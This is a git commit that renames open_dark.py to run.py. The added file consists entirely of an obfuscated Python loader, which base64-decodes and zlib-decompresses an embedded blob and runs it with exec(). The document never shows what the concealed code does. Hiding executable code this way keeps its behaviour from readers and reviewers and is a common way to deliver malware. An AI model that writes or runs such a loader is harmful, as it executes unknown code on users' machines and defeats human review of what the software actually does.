60d69849de253e13c9fe6b4d69c819ae2ffa89ad
Omsenpai17 <70789166+Omsenpai17@users.noreply.github.com>
2022-04-15 11:20:23 +0700

    Rename open_dark.py to run.py

---
+++ run.py
@@ -0,0 +1,2 @@
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJw1zksOgyAURuG5qzAd6UQEFbBJ19A14OVXSeqjcE1dfu2gyRmewReWfYucR7wPJE5ZdsRX/sjH28y8p7sQU0hcTYHnYzgSIm0rY+WKtkU8l4R1d0Ea0TXWKkVu9Fb71tXQGt6MPcjqBvAiuo/QRiko72hovWwgDSnZd7UbO2da0JXsGk+1SBTDzreMNo8L88dVE7i4fGXFODnDCSp+S/kFza1Bbw==")))
